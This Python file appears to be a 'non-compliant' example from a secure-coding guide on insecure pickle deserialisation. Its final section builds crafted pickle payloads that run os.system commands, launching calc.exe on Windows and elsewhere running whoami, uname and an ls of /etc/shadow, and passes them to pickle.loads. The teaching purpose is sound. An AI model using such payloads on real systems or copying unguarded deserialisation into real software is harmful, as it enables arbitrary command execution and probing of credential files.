""" Non-Compliant Code Example """
import platform
import pickle


class Message(object):
    """Sample Message Object"""
    sender_id = 42
    text = "Some text"

    def printout(self):
        """prints content to stdout to demonstrate active content"""
        print(f"Message:sender_id={self.sender_id} text={self.text}")


class Preserver(object):
    """Demonstrating deserialisation"""

    def can(self, _message: Message) -> bytes:
        """Serializes a Message object.
            Parameters:
                _message (Message): Message object
            Returns:
                _jar (bytes): pickled jar as string
        """
        return pickle.dumps(_message)

    def uncan(self, _jar) -> Message:
        """De-serializes a Message object.
            Parameters:
                _jar (String): Pickled jar
            Returns:
                (Message): Message object
        """
        return pickle.loads(_jar)


# serialization of a normal package
p1 = Preserver()
message = Message()
message.printout()
jar = p1.can(message)

# sending or storing would happen here
p2 = Preserver()
message = None
message = p2.uncan(jar)
message.printout()

#####################
# exploiting above code example
#####################
print("-" * 10)
print("Attacker trying to read the message")
message = pickle.loads(jar)
message.printout()

print("-" * 10)
if platform.system() == "Windows":
    PAYLOAD = b"""cos
system
(S'calc.exe'
tR."""
else:
    PAYLOAD = b"""cos
system
(S'whoami;uptime;uname -a;ls -la /etc/shadow'
tR."""
print("Attacker trying to inject PAYLOAD")
p3 = Preserver()
message = None
message = p3.uncan(PAYLOAD)
